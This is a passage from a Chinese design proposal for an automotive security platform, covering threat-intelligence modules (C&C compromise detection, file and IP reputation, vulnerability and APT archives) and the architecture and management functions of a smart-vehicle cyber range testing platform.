重要。漏洞情报不仅包括常见的应用层漏洞和系统漏洞，如Web应用的漏洞、操作系统如Linux、安卓、QNX等的漏洞，还涵盖了中间件漏洞和各种车载通信协议的漏洞。这些通信协议包括WiFi、蓝牙、蜂窝网络、以太网等，在车辆系统中起着至关重要的作用。除此之外，还需要关注车辆系统中使用的芯片和其他硬件组件的漏洞，因为它们可能成为攻击者的目标。通过收集和分析这些漏洞情报，可以及时发现和修复安全缺陷，防止潜在的安全事件发生。</li><li>APT（Advanced Persistent Threat，高级持续性威胁）档案库是威胁情报平台中的重要组成部分，它提供了关于APT攻击团伙的详尽资料。这些资料包括APT团伙的攻击模式、使用的工具、历史行动、攻击目标等信息，构成了完整的攻击者背景画像。这样的档案库对于理解和防御APT攻击至关重要，因为APT攻击通常具有高度的隐蔽性和针对性，只有深入了解攻击者的行为和特点，才能有效地构建防御体系，减少攻击的成功率。</li><li>安全通告是威胁情报平台提供的一项重要服务，它包括全面的安全漏洞、恶意软件、网络攻击等多维度的安全信息。这些通告通常是来自于安全社区的共享、行业组织的通报、以及平台自身的研究成果。它们为用户提供了即时的安全预警和深入的分析解读，帮助用户及时了解安全威胁的最新动态，并采取相应的防护措施。</li><li>情报运营分析是威胁情报平台的又一核心能力，它可以提供全面的数据情报运营分析能力，为运营平台的安全决策提供辅助数据支撑。通过对大量情报数据的收集、分析和解读，情报平台能够为安全运营提供有价值的洞察，包括威胁趋势的预测、攻击手法的分析、安全防护效果的评估等。这些分析结果可以帮助运营团队更好地理解安全形势，优化安全策略，提高防御效能，最终为企业的安全保驾护航。</li></ol><h3 id="失陷检测情报"><a href="#失陷检测情报" class="headerlink" title="失陷检测情报"></a>失陷检测情报</h3><p>威胁情报中心可以提供有关攻击者的远程命令与控制服务器情报，用于发现被APT组织、僵尸网络、木马软件、后门工具等控制的失陷主机。这些情报将被推送到威胁情报平台，方便情报信息的查找。</p><h4 id="功能实施方案-16"><a href="#功能实施方案-16" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>此平台通过收集有关有关攻击者的远程命令与控制服务器情报，安全团队能够识别出内部网络中那些已经沦陷，被APT组织（高级持续性威胁）、僵尸网络、木马软件或后门工具所掌控的失陷主机。这些情报包括但不限于控制服务器的IP地址、使用的域名、活动模式及其通信特征，这些关键信息一旦被识别和验证，即可推送至威胁情报平台。威胁情报平台利用这些数据，通过其高速查询功能，确保安全分析师能够迅速检索和分析疑似的控制通信，从而及时发现并应对潜在的安全威胁，这对于维持组织的网络安全和防御能力至关重要。</li></ol><h4 id="技术实现内容-12"><a href="#技术实现内容-12" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="失陷检测情报功能说明"><a href="#失陷检测情报功能说明" class="headerlink" title="失陷检测情报功能说明"></a>失陷检测情报功能说明</h5><p>威胁情报中心（Threat Intelligence Center）是一个专门负责收集、分析和提供有关威胁情报的组织或部门。它的主要目标是帮助组织识别和应对各种网络安全威胁，包括攻击者的远程命令与控制服务器（C&amp;C Server）情报。</p><p>远程命令与控制服务器是攻击者用来控制被攻陷的主机或网络的服务器。攻击者通过C&amp;C服务器发送指令，控制受感染的主机执行各种恶意活动，例如传输数据、发起攻击、窃取敏感信息等。威胁情报中心通过收集和分析与C&amp;C服务器相关的信息，提供有关这些服务器的情报。</p><p>失陷威胁情报的功能包括：</p><h6 id="收集情报"><a href="#收集情报" class="headerlink" title="收集情报"></a>收集情报</h6><p>通过监测网络流量、分析恶意软件样本、参与安全事件响应等方式，收集与C&amp;C服务器相关的情报。这些情报可以包括C&amp;C服务器的IP地址、域名、通信协议、指令和控制机制等。并且确保收集和共享情报的合规性，遵循相关法规和隐私政策。对于敏感信息，确保进行适当的脱敏或匿名化处理。</p><h6 id="分析情报"><a href="#分析情报" class="headerlink" title="分析情报"></a>分析情报</h6><p>对收集到的情报进行深入分析和研究，以了解攻击者的行为模式、技术手段和攻击策略。通过分析C&amp;C服务器的特征和行为，可以发现被APT组织、僵尸网络、木马软件、后门工具等控制的失陷主机。</p><h6 id="推送情报"><a href="#推送情报" class="headerlink" title="推送情报"></a>推送情报</h6><p>将分析得到的情报推送到威胁情报平台，使其他安全团队和系统能够访问和利用这些情报。失陷检测威胁情报平台可以是一个集中的信息共享平台，帮助各个组织共享和获取最新的威胁情报，以便更好地保护自身网络安全。</p><h3 id="文件信誉情报"><a href="#文件信誉情报" class="headerlink" title="文件信誉情报"></a>文件信誉情报</h3><p>利用云端丰富的样本资源，并采用多种技术方式进行分析，以判断文件是否恶意以及具体的类型和家族等信息。使用文件的哈希值作为索引，包括判断文件是否为白文件、是否恶意、恶意类型、家族信息等。针对已知的木马、蠕虫、恶意软件、黑客工具、APT样本，还可以提供相应哈希样本的网络IOC信息。在本地维护一个缓存库，对样本信誉数据进行存储，如果数据未命中，则会向云端查询。云端库拥有百亿条以上的数据。</p><h4 id="功能实施方案-17"><a href="#功能实施方案-17" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>文件信誉情报服务是网络安全防护的重要组成部分，它依托于云端庞大的样本数据库，通过运用多种分析技术，如静态分析、动态行为分析、沙箱检测、启发式分析等方法，对文件进行全面的安全评估。这些技术共同作用，能够准确地判断一个文件是否具有恶意行为，并进一步识别出该文件的具体类型和家族信息。这样的智能分析不仅提高了恶意软件检测的准确性，还加快了识别速度，为用户提供了及时有效的网络安全保护。</li><li>文件信誉情报服务以文件的哈希值（HASH）作为唯一索引，建立了一个详尽的信息库，其中涵盖了文件的多维度信息。这些信息包括文件是否属于白名单（即安全文件）、是否被识别为恶意文件、恶意软件的类别、所属的家族及家族信息等。对于已知的木马、蠕虫、恶意软件、黑客工具和APT（高级持续性威胁）样本，该服务还能提供与这些恶意样本相关联的网络指标（IOC，即Indicators of Compromise），这些指标对于追踪攻击活动、防御未来威胁具有重要意义。通过这些详尽的信息，用户可以快速识别潜在威胁，并采取相应的防护措施。</li><li>为了提高查询效率和降低网络延迟，样本信誉服务在本地维护了一个Cache库，用于存储频繁访问或最近查询的样本信誉数据。当本地Cache库不能命中用户查询的数据时，服务将会自动转到云端进行查询。云端的样本数据库拥有庞大的数据量，超过百亿条记录，涵盖了各种类型的恶意软件信息。这种本地与云端相结合的查询机制既保证了数据查询的高速响应，又确保了信息的全面性和更新性，为用户提供了一个强大的网络安全防线。</li></ol><h4 id="技术实现内容-13"><a href="#技术实现内容-13" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="文件信誉情报功能说明"><a href="#文件信誉情报功能说明" class="headerlink" title="文件信誉情报功能说明"></a>文件信誉情报功能说明</h5><h6 id="云端样本资源"><a href="#云端样本资源" class="headerlink" title="云端样本资源"></a>云端样本资源</h6><p>利用云端存储的样本资源进行文件分析。可以从云端访问大量的样本文件，这些样本文件可以是已知的恶意文件、黑客工具、APT样本等。云端样本资源的优势在于可以集中存储、共享和更新样本文件，以提供更准确和实时的分析结果。</p><p>为了确定文件的恶意性和具体信息，文件信誉情报采用多种技术方式进行分析。这些技术方式可能包括静态分析、动态分析、行为分析等。通过综合应用这些技术，可以获取关于文件的详细信息，如恶意代码、行为特征、攻击方式等。</p><h6 id="文件哈希值作为索引"><a href="#文件哈希值作为索引" class="headerlink" title="文件哈希值作为索引"></a>文件哈希值作为索引</h6><p>使用文件的哈希值作为索引来标识和查询文件。哈希值是通过对文件内容进行哈希算法计算而得到的唯一标识符。通过对文件进行哈希计算，可以快速检索和比对已知的哈希值数据库，以确定文件是否已经被分析过、是否为白文件或已知的恶意文件。</p><h6 id="缓存库和云端库"><a href="#缓存库和云端库" class="headerlink" title="缓存库和云端库"></a>缓存库和云端库</h6><p>在本地维护一个缓存（cache）库，用于存储样本信誉数据。对于已经分析过的文件，可以在本地进行快速查询，而无需每次都向云端发送请求。如果本地缓存库中未找到相关数据，系统将向云端查询，云端库中拥有百亿条以上的数据，可以提供更全面的信息。</p><h6 id="网络IOC信息"><a href="#网络IOC信息" class="headerlink" title="网络IOC信息"></a>网络IOC信息</h6><p>对于已知的木马、蠕虫、恶意软件、黑客工具、APT样本，系统可以提供相应哈希样本的网络IOC（Indicator of Compromise）信息。网络IOC是指表明系统已受到攻击或可能受到攻击的特征或指标。通过提供网络IOC信息，可以帮助其他用户或系统识别并防范已知的恶意活动。</p><h6 id="支持异步查询"><a href="#支持异步查询" class="headerlink" title="支持异步查询"></a>支持异步查询</h6><p>异步查询支持有助于提高系统的效率和可用性，特别是在处理大规模数据或需要复杂计算的情况下。用户可以提交查询请求后立即进行其他操作，而不必等待查询完成。系统会在后台处理查询任务，并在完成后提供结果或任务完成的通知。这种设计使得系统更具弹性，能够更好地处理并发请求，提高了用户体验和系统的整体性能。</p><h3 id="IP信誉情报"><a href="#IP信誉情报" class="headerlink" title="IP信誉情报"></a>IP信誉情报</h3><p>支持互联网攻击IP地址的情报信息，可以判断该IP地址是否有历史攻击行为、是否为IDC主机、是否为傀儡主机、是否为代理或Tor网主机、是否可能是扫描机器人等。</p><h4 id="功能实施方案-18"><a href="#功能实施方案-18" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>平台内部具备高级的分析能力，能够对攻击者使用的IP地址进行深入的研究和评估。首先，平台能够追踪一个IP地址的历史攻击行为，这包括任何已知的恶意活动、参与过的攻击类型以及攻击的频率和规模。平台还能够识别IP地址是否属于互联网数据中心（IDC）主机。IDC主机往往涉及在云服务环境中托管的服务器，这些服务器可能被黑客租用或者滥用来发起攻击，因此对这类IP的监控尤为重要。此外，平台也能够检测傀儡主机，即那些被黑客控制的设备，通常用于构建僵尸网络，从而在不知情的情况下被用来发动攻击。还包括识别是否有IP地址作为代理服务器或Tor网络的出口节点使用。平台还具备检测潜在的扫描机器人的能力，这些机器人可能在对网络进行自动化扫描以寻找漏洞或进行其他恶意探测活动。通过集成这些功能，安全平台为网络安全专家提供了强大的工具，以便他们可以更加有效地识别风险，采取预防措施，以及在必要时快速响应潜在的安全威胁。</li></ol><h4 id="技术实现内容-14"><a href="#技术实现内容-14" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="IP信誉情报功能说明"><a href="#IP信誉情报功能说明" class="headerlink" title="IP信誉情报功能说明"></a>IP信誉情报功能说明</h5><h6 id="历史攻击行为分析"><a href="#历史攻击行为分析" class="headerlink" title="历史攻击行为分析"></a>历史攻击行为分析</h6><p>威胁情报中心可以维护一个数据库，记录已知的攻击IP地址和相关的攻击行为历史。通过查询这个数据库，可以了解到该IP地址是否有过历史攻击行为，以及攻击的类型和频率等信息。</p><p>具备具有地理位置和网络行为关联分析功能分析互联网攻击IP地址的地理位置与网络行为之间的关联。通过结合地理位置信息和网络活动模式，系统可以判断某个IP地址的行为是否与其地理位置相符，以及是否存在异常行为。</p><h6 id="所属分析"><a href="#所属分析" class="headerlink" title="所属分析"></a>所属分析</h6><p>IDC主机：IDC（Internet Data Center）主机通常由互联网服务提供商（ISP）或数据中心运营商提供。威胁情报中心可以通过IP地址的归属信息来判断该IP地址是否为IDC主机。IDC主机可能被黑客用作攻击来源或代理服务器。</p><p>傀儡主机：傀儡主机是指被黑客控制并用于发起攻击的合法主机。威胁情报中心可能会收集和分析与傀儡主机相关的信息，例如与傀儡主机通信的恶意命令和控制服务器（C&amp;C Server）等，以帮助识别傀儡主机。</p><p>代理或Tor网络主机：代理服务器和Tor网络（The Onion Router）是常用的网络匿名化工具。威胁情报中心可以通过分析网络流量、检测代理服务器和Tor节点等方式，判断该IP地址是否为代理或Tor网络主机。这些主机可能被攻击者用于隐藏其真实身份或发起攻击。</p><p>扫描机器人：扫描机器人是指自动化程序或恶意软件，用于扫描互联网上的目标主机，寻找潜在的漏洞和易受攻击的系统。威胁情报中心可能会监测和分析与扫描行为相关的数据，可以识别的扫描机器人和其活动。</p><h6 id="IP归属地和IP信誉评分"><a href="#IP归属地和IP信誉评分" class="headerlink" title="IP归属地和IP信誉评分"></a>IP归属地和IP信誉评分</h6><p>支持确定IP地址的归属地，帮助运营人员了解其来源和地理位置信息。按一定算法对IP进行信誉评分。</p><h3 id="漏洞情报"><a href="#漏洞情报" class="headerlink" title="漏洞情报"></a>漏洞情报</h3><p>支持针对当前的漏洞数据基于时间范围、漏洞名称、风险等级等维度进行漏洞情报查询。还可以实时监控漏洞更新数据，并以可视化卡片的形式展示当前的漏洞更新情况。</p><h4 id="功能实施方案-19"><a href="#功能实施方案-19" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>平台提供了一项强大的漏洞情报查询功能，允许用户根据不同的查询维度来筛选和查看当前的漏洞数据。这些维度包括时间范围、漏洞名称、风险等级等，使得用户能够快速定位到特定时期的漏洞，或者根据漏洞的严重程度进行优先处理。例如，用户可以选择过去一周内报告的高风险漏洞，或者搜索特定名称的漏洞以了解其详情和可能的影响。这种灵活的查询功能不仅提高了用户对网络安全状况的认知，也加快了对潜在威胁的响应速度，从而大大提升了整个网络环境的安全性。</li><li>平台设计了一种实时监控机制，能够不断追踪和更新最新的漏洞数据。这些数据通过一个直观的可视化卡片界面呈现，每个卡片都代表一个特定的漏洞，展示了该漏洞的关键信息，如名称、风险等级、受影响的系统等。用户可以一目了然地看到最近发现的漏洞及其相关信息，这不仅使得漏洞管理变得更加高效，也使得用户能够快速采取措施来减轻或消除这些漏洞带来的风险。此外，这种可视化展示还可以帮助用户更好地理解漏洞的分布情况和趋势，为制定更有效的安全策略提供支持。</li></ol><h4 id="技术实现内容-15"><a href="#技术实现内容-15" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="漏洞情报功能说明"><a href="#漏洞情报功能说明" class="headerlink" title="漏洞情报功能说明"></a>漏洞情报功能说明</h5><h6 id="漏洞信息查询"><a href="#漏洞信息查询" class="headerlink" title="漏洞信息查询"></a>漏洞信息查询</h6><p>时间范围查询：支持指定一个时间范围，例如最近一周、最近一个月或自定义时间段，来查询在该时间范围内的漏洞数据。这样可以了解最新的漏洞情报和趋势。</p><p>漏洞名称查询：支持根据特定的漏洞名称或漏洞编号进行查询。这样可以针对关注的特定漏洞进行查询，了解其相关的详细信息和风险评级。</p><p>风险等级查询：可以根据漏洞的风险等级进行查询，例如高危、中危、低危等级，筛选出与关注的风险级别相匹配的漏洞信息。</p><p>支持图例标识漏洞和漏洞快捷筛选：提供图例解释不同类型安全事件的标识，同时允许用户根据特定类型或时间范围筛选感兴趣的安全事件。</p><h6 id="漏洞情报实时更新"><a href="#漏洞情报实时更新" class="headerlink" title="漏洞情报实时更新"></a>漏洞情报实时更新</h6><p>实时漏洞更新监控：威胁情报中心可以提供实时的漏洞更新数据，并以可视化卡片的形式展示当前的漏洞更新情况。支持通过监控这些卡片来了解最新的漏洞信息、修复建议和风险评估，以及可能受影响的系统和软件</p><h3 id="APT档案库"><a href="#APT档案库" class="headerlink" title="APT档案库"></a>APT档案库</h3><p>通过全球地图的可视化方式呈现全球活跃的APT组织和团伙，并支持检索和查看详细数据。APT组织团伙的数据包括团伙简介、团伙概述、技战法、APT情报、历史报告和关系图谱数据。</p><h4 id="功能实施方案-20"><a href="#功能实施方案-20" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>平台采用了一种创新的全球地图可视化手段，这种方式可以直观地展示全球范围内活跃的高级持续性威胁（APT）组织和犯罪团伙的分布情况。用户可以通过这个全球地图快速识别出特定地区的威胁活动，并利用搜索功能深入检索任何地区的详细APT信息。地图上的每个标记都代表着一个活跃的APT组织或团伙，用户点击这些标记后，可以查看到相关团伙的详细数据，这些数据包括团伙的活动范围、攻击模式、受影响的行业等。这种可视化展示不仅增强了用户对全球网络安全态势的认识，还提供了一个直观的方式来追踪和分析跨国的网络安全威胁。</li><li>平台中关于APT组织团伙的数据内容非常丰富，涵盖了多个方面的详细信息。每个APT组织团伙的数据包括但不限于：团伙简介，这部分提供了对团伙背景的基本描述，包括其成立时间、主要成员和历史活动；团伙概述，这部分深入介绍了团伙的操作模式、目标选择、攻击手段等；技战法，这部分分析了团伙的攻击技术、使用的恶意软件和漏洞利用情况；APT情报，这部分包含了团伙相关的最新情报信息，帮助用户了解当前的威胁态势；历史报告，这部分搜集了团伙过往的攻击行动和相关的研究报告；关系图谱数据，这部分通过图谱的形式展示了不同APT组织之间的关联和合作情况。这些详尽的数据资料为网络安全分析人员提供了全面的参考，助力于对APT组织的深入了解和有效防御。</li></ol><h4 id="技术实现内容-16"><a href="#技术实现内容-16" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="APT档案库功能说明"><a href="#APT档案库功能说明" class="headerlink" title="APT档案库功能说明"></a>APT档案库功能说明</h5><h6 id="APT信息展示和查找"><a href="#APT信息展示和查找" class="headerlink" title="APT信息展示和查找"></a>APT信息展示和查找</h6><p>可视化地图：通过全球地图的可视化方式，直观地了解全球范围内活跃的APT组织和团伙的分布情况。这样可以帮助您对全球威胁态势有一个整体的认识。</p><p>检索和查看详细数据：使用搜索功能来检索特定的APT组织或团伙，并查看其详细数据。这些数据可能包括团伙的简介、概述、技术战术、APT情报、历史报告和关系图谱等信息。</p><p>团伙简介和概述：每个APT团伙都可以提供一个简介和概述，介绍该团伙的背景、活动特点和目标等信息。这样可以帮助您了解该团伙的基本情况。</p><p>APT活动热度:可以根据不同APT组织和团伙的活跃程度来呈现。这个指数可以展示在全球地图上，使用视觉化方式表现不同组织的活跃程度。</p><h6 id="APT信息分析和总结"><a href="#APT信息分析和总结" class="headerlink" title="APT信息分析和总结"></a>APT信息分析和总结</h6><p>技战法：技战法（TTPs，Tactics, Techniques, and Procedures）是APT团伙在攻击中使用的特定技术、战术和程序。威胁情报中心可以提供关于不同APT团伙常用的技战法的详细描述和示例。</p><p>APT情报和历史报告：威胁情报中心可以提供关于APT团伙的情报信息和历史报告。这些情报和报告可能包括与该团伙相关的最新威胁情报、攻击活动分析、受影响的行业或组织等信息。</p><p>关系图谱数据：关系图谱可以展示APT团伙之间的关联关系、合作关系、攻击目标等。这样可以帮助理解APT团伙之间的网络和行动关系。</p><h3 id="数据更新"><a href="#数据更新" class="headerlink" title="数据更新"></a>数据更新</h3><h4 id="功能实施方案-21"><a href="#功能实施方案-21" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>在具备互联网连接的条件下，该平台能够确保情报系统能够实现小时级别的快速更新和升级。这样的设计允许平台能够在最短的时间内接收并部署最新的安全情报、补丁和功能增强。这种高频率的更新策略对于追踪和反应网络安全威胁至关重要，能够大大减少潜在的风险暴露时间。小时级的更新保证了平台用户能够及时得到最新的威胁情报，使得安全防御能够与日益复杂的网络威胁同步进化。</li><li>对于无法实时连接互联网的离线环境，平台同样提供了一种灵活的解决方案。通过升级包的形式，用户可以在有网络的环境中下载最新的更新内容，然后将这些升级包导入到离线的平台中以实现更新。虽然这种方式无法做到实时更新，但是通过准天级的更新频率，也就是每天至少一次的更新周期，仍然可以确保情报系统保持相对较新的状态。这种离线更新机制对于那些在封闭网络环境下运作的关键系统来说尤为重要，它们需要在保持安全隔离的同时，仍能接收到最新的安全情报和功能改进。</li></ol><h4 id="数据在线和离线更新"><a href="#数据在线和离线更新" class="headerlink" title="数据在线和离线更新"></a>数据在线和离线更新</h4><p>提供多种更新方式，包括在线和离线更新方式。灵活满足不同需求，根据实际情况选择最适合的更新方式，确保系统始终具备最新的威胁情报，以适应不断演化的威胁环境。</p><p>在互联网连接情况下，情报以小时为单位进行更新升级</p><p>在离线情况下以升级包导入方式升级，情报准天级更新升级</p><h1 id="智能汽车网络靶场检测平台"><a href="#智能汽车网络靶场检测平台" class="headerlink" title="智能汽车网络靶场检测平台"></a>智能汽车网络靶场检测平台</h1><h2 id="技术路线-1"><a href="#技术路线-1" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="技术架构描述"><a href="#技术架构描述" class="headerlink" title="技术架构描述"></a>技术架构描述</h3><h4 id="功能实施方案-22"><a href="#功能实施方案-22" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>安全检测平台基于微服务架构设计使得每个服务单元都是独立、轻量级且易于维护的。这种架构允许平台灵活地扩展和更新各个微服务，而不会影响到其他部分的正常运作。微服务架构还促进了团队之间的协作，因为每个团队可以专注于特定服务的开发和优化。这种设计方法提高了整个平台的可用性和可靠性，因为即使某个服务出现问题，也不会导致整个系统的崩溃。</p><p>安全检测平台的开发架构采用前后端分离的模式，前端负责用户界面的展示和用户交互，而后端专注于数据处理和逻辑运算。这样的分离使得前端可以使用现代的JavaScript框架如React或Vue.js来创建动态和响应式的网页，而后端则可以专注于API的开发和数据管理。这种分离还简化了开发和测试过程，因为前后端可以独立进行，提高了开发效率。</p><p>安全检测平台的前端采用组件化开发方法，将界面拆分为可重用的组件，每个组件负责一块特定的功能。这种方法提高了开发效率，因为开发人员可以复用组件并快速构建复杂的用户界面。同时，组件化也使得前端代码更易维护，因为每个组件都是独立的。</p><p>安全检测平台的REST接口设计遵循了RESTful原则，提供了一套清晰、一致的API供前端调用。这些接口以标准的HTTP方法来执行操作，如GET、POST、PUT和DELETE，使得数据交换变得直观和高效。这种设计也便于不同的客户端和服务之间的通信，因为REST接口是基于HTTP的，是一种广泛支持的网络协议。</p><p>安全检测平台支持数据实时通信交互技术，如WebSocket或Server-Sent Events，这使得客户端可以实时接收到服务器端的更新。这对于需要快速响应的安全事件和实时监控非常关键，因为用户可以立即看到最新的威胁信息和安全警报，而无需手动刷新页面。</p><p>安全检测平台支持缓存数据库技术，如Redis，来存储热点数据和会话信息。这种缓存机制显著提高了数据检索的速度，缓解了后端数据库的处理压力，有利于整体性能的表现。</p><p>安全检测平台支持异步任务执行队列，这允许系统将耗时的任务放入队列中异步处理，而不会阻塞主线程。这种方式提高了系统的响应能力和吞吐量，尤其是在处理大量数据或执行复杂运算时。</p><p>安全检测平台支持多线程处理任务状态，这意味着平台能够同时处理多个任务，而不会互相干扰。多线程技术使得CPU资源得到更有效的利用，提高了任务的处理速度和系统的并发能力。</p><p>安全检测平台支持负载均衡和分布式部署，这确保了在用户请求量增加时，负载可以在多个服务器之间分散，避免了单点故障和性能瓶颈。这种架构也便于平台的水平扩展，因为可以根据需要简单地增加服务器节点。</p><p>安全检测平台支持配置第三方访问源授权，这使得平台能够安全地与第三方服务集成，如云服务提供商和其他安全工具。通过OAuth或类似的授权机制，平台可以控制哪些第三方应用可以访问其数据和服务，保障了数据的安全性。</p><p>安全检测平台支持对接靶场基础平台的零部件及系统测试任务同步，这意味着平台可以与专门用于安全测试的靶场基础设施无缝集成，自动同步测试任务和结果。这种集成简化了测试流程，提高了测试效率，并确保了测试结果的准确性和及时性。</p><p>安全检测平台支持对接靶场检测结果，进行报告统计汇总。这允许平台收集来自靶场的各种检测结果，自动生成综合报告。这些报告为安全分析师提供了宝贵的洞察，帮助他们评估系统的安全状况，识别潜在的弱点，并提出改进建议。</p><h4 id="技术实现内容-17"><a href="#技术实现内容-17" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>该安全检测平台采用微服务架构设计，前后端分离，前端组件化开发，REST接口设计。以下是平台的主要组件和技术选型：</p><p>1.前端开发</p><p>使用现代化的前端框架，如React、Vue.js或Angular，实现前端页面的组件化开发。使用Webpack或Parcel等工具进行代码打包和构建。前端页面通过REST接口与后端进行通信，获取数据并展示。</p><p>2.后端开发</p><p>使用微服务架构，将不同功能模块拆分为独立的服务。使用Spring Boot或Node.js等框架开发微服务。使用RESTful风格设计API接口，提供数据和功能的访问。使用JSON或其他标准数据格式进行数据交互。</p><p>3.数据实时通信交互技术</p><p>使用WebSocket协议实现实时通信，用于平台和客户端之间的双向通信。使用Socket.io、SignalR等库简化WebSocket的使用。通过实时通信技术，可以实现实时推送更新、通知和进度信息等功能。</p><p>4.缓存数据库</p><p>使用Redis或Memcached等缓存数据库，用于缓存频繁访问的数据，提高读取性能。将常用的查询结果、计算结果等存储在缓存数据库中，减少对主数据库的访问。</p><p>5.异步任务执行队列</p><p>使用消息队列系统，如RabbitMQ、Kafka或ActiveMQ，实现异步任务的执行队列。将需要异步执行的任务放入消息队列中，由消费者进行处理。通过消息队列可以实现任务的解耦和削峰填谷，提高系统的稳定性和吞吐量。</p><p>6.多线程处理任务状态：</p><p>在任务处理过程中，使用多线程技术提高任务处理的并发性和效率。使用线程池管理线程资源，避免频繁创建和销毁线程。使用锁、信号量等机制确保多线程访问共享资源的安全性。</p><p>7.负载均衡和分布式部署</p><p>使用负载均衡器（如Nginx、HAProxy等）将请求分发到多个后端服务实例。将微服务部署在多个服务器上，实现分布式部署，提高系统的可用性和扩展性。使用容器化技术（如Docker、Kubernetes）简化部署和管理。</p><p>8.配置第三方访问源授权</p><p>使用OAuth、JWT等认证和授权机制，实现对第三方访问源的授权验证。在平台中集成认证服务器或使用第三方认证服务，对访问源进行认证和授权。确保只有经过授权的访问源可以访问平台的API接口和功能。</p><p>9.对接靶场基础平台的零部件及系统测试任务同步；</p><p>10.对接靶场检测结果，进行报告统计汇总。</p><h3 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h3><h4 id="功能实施方案-23"><a href="#功能实施方案-23" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>系统管理模块是安全检测平台的核心组成部分，它提供了复杂的权限划分功能，允许管理员根据组织的需求和安全策略设定不同的访问级别。用户管理功能允许管理员添加、删除或修改用户信息，以及追踪用户活动。角色管理功能则让管理员能够创建角色，并将特定权限分配给这些角色。审批流程确保了所有敏感操作都经过适当的审查流程，而审计功能则记录所有关键操作，为合规性检查和后续审计提供必要的日志信息。</p><p>车型管理功能为测试车型提供全面的管理能力，包括添加、编辑和删除测试车型的能力。它还支持管理通用控制器和通用测试项，如测试功能和测试网络。平台允许设置特定的车型接口人来负责沟通和协调任务，同时提供需求文档管理功能，以确保所有文档都得到妥善的维护和更新。此外，车型管理还包括对车型的整体测试进度和内容的规划，以及强大的统计功能，以便跟踪和报告测试活动的各个方面。</p><p>计划管理模块提供了一个直观的界面，让测试人员可以根据权限查看和管理测试计划。可以为每个测试项安排具体的测试时间，确保资源的有效分配。此外，计划管理还包括统计和审核功能，使管理层可以监控测试进度，并对测试计划进行审批，确保测试活动符合组织的标准和要求。</p><p>任务管理模块允许用户基于测试计划创建具体的测试任务，并提供了一系列管理功能，包括并行执行多个测试任务，查看测试需求和工具的占用情况，以及监控任务的状态。等待序列的展示和实时的执行状态更新确保了测试人员可以快速响应任何变化。用例详情视图提供了关于测试步骤、需求和结果的详细信息，而FAIL测试项会自动生成漏洞记录。此外，任务管理还支持测试结果的展示和管理，以及测试报告、用例和测试内容计划的下载功能，并包含了强大的统计工具。</p><p>用例管理模块为测试用例提供了总览和分类展示功能，用户可以根据不同的分类和标签浏览和选择测试用例。编辑功能允许用户修改测试用例步骤，以及将测试用例与特定的测试需求关联起来。用例管理模块还包含了统计、审核和管理功能，确保测试用例的质量和一致性。此外，它还支持管理通用测试项，如功能测试和网络测试，以便测试人员可以快速找到和使用这些资源。</p><p>结果管理模块提供了一个总览界面，用户可以在此查看所有测试结果的概况。详情展示功能允许用户深入每个测试结果，了解更多细节。管理功能使得用户可以对测试结果进行排序、过滤和搜索，而统计功能则提供了各种图表和报告，帮助用户分析测试结果。此外，结果管理还支持在任务中展示单独的测试结果，使得用户可以在执行任务时即时查看相关结果。</p><p>工具管理模块是平台的另一个关键组成部分，它允许用户查看和配置测试工具的接入权限。工具使用记录功能帮助用户追踪工具的使用情况，而工具占用状态展示则确保资源的有效分配。此外，内置工具说明文件和调用API等信息提供了必要的指导，帮助用户正确使用工具。统计功能则为管理层提供了工具使用情况的概览。</p><p>知识库管理模块支持自定义文件结构，使得用户可以根据需要创建和维护知识库的内容。导入功能允许用户将漏洞积累和漏洞利用文档添加到知识库中，而编辑功能则支持在文档内添加图片和文本，以及上传附件文件。这些功能确保了知识库的内容丰富、更新及时，并且易于使用。</p><p>漏洞管理模块提供了一系列功能，以支持对漏洞数据库的维护和更新。离线更新功能确保了即使在没有网络连接的情况下，漏洞数据库也能保持最新。管理功能允许用户根据车型对漏洞进行分类和管理，而漏洞导入和导出功能则支持数据的迁移和备份。任务自动生成功能可以基于测试结果自动创建漏洞记录，而相同漏洞合并功能则避免了重复记录的产生。此外，漏洞管理还支持自动CVSS3.0评分计算，以及在报告中展示漏洞的详细步骤和来源，并提供详细的测试FAIL项清单和FAIL项详细说明，供用户开展后续处置工作。统计功能为管理层提供了关于漏洞分布和趋势的洞察，而导出功能则支持将漏洞利用文档添加到知识库中，且提供在线的文本编辑器，用于支持在线编辑漏洞利用文档。</p><p>主页设计为用户提供了一个易于导航的界面，支持多个入口点，以便用户可以快速访问平台的各个模块。用户可以自由选择展示模块，根据个人偏好定制主页内容。统计功能在主页上提供了关键指标的快速概览，而统计图和车型拓扑图的切换展示则为用户提供了不同的视角来查看数据。快捷入口功能则确保了用户可以从主页快速进入到最常用的功能或模块。</p><p>平台提供了全面的车型测试综合业务管理功能，覆盖了从车型管理到结果管理的整个测试流程，包括车型管理，计划管理，需求管理，用例管理，任务管理，漏洞管理，报告管理，结果管理等。这些管理功能包括多维度条件查询，以便用户可以根据不同的标准找到所需的信息。添加数据功能支持用户快速录入新的测试数据，而关联数据联动修改和删除功能则确保了数据的一致性和准确性。</p><p>文档管理功能提供了全面的文件管理能力，包括分享权限分配和自定义文件夹管理。用户可以根据文件的类型和用途创建不同的文件夹，以便于查找和管理文档。并为不同用途的文档制定制定分享权限。支持文档预览功能，用户能够通过预览功能查看文档内容，如基础类文档，合规文档和基础规范文档，技术类文档，如测试说明文档和工具说明文档等。</p><p>平台支持对外提供测试数据，可以输出API接口文档，输出的接口文档包含接口的功能，字段含义，以及取值类型和范围。这些信息对于外部开发者来说是非常有价值的，可以帮助他们理解如何与平台进行交互。</p><p>平台支持对外提供接入的能力，管理员可以配置允许的请求源接入，确保只有授权的用户可以访问平台的数据和服务。输出API接口功能为外部应用